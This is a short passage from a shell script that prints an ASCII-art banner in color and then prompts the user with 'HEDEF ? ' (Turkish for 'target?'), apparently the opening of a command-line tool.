	echo " ▀▀▀  ▀█▄▀▪.▀  ▀ ▀▀▀▀ ▀▀▀ · ▀  ▀ ▀▀  █▪▀▀▀▀▀  █▪▀▀▀ ▀▀▀ .▀  ▀"
	echo " "
    echo -e "   ${YELLOW}                                        "
echo "HEDEF ? "
